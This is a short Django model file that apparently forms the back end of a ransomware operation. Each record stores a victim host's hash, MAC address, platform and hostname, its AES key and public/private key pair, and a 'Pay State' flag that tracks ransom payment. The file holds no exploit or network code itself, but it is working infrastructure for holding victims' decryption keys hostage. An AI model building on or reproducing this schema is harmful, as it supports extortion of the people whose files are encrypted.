import django
from django.db import models
from django.utils import timezone


class Precious(models.Model):
    def __str__(self):
        return self.hash

    id = models.AutoField(auto_created=True, primary_key=True)
    hash = models.CharField(max_length=64, blank=False, verbose_name="Hash")
    mac = models.CharField(max_length=12, blank=False, verbose_name="MAC")
    platform = models.CharField(max_length=64, blank=False, verbose_name="Platform")
    hostname = models.CharField(max_length=128, blank=False, verbose_name="Hostname")
    aes_key = models.CharField(max_length=16, blank=False, verbose_name="Aes Key")
    public_key = models.TextField(max_length=512, blank=False, verbose_name="Public Key")
    private_key = models.TextField(max_length=1024, blank=False, verbose_name="Private Key")
    pay = models.BooleanField(blank=False, default=False, verbose_name="Pay State")
    timestamp = models.DateTimeField(default=django.utils.timezone.now, blank=False,
                                     verbose_name='Exactly Time')

    class Meta:
        managed = True
        verbose_name_plural = 'Precious'
        db_table = 'Precious'
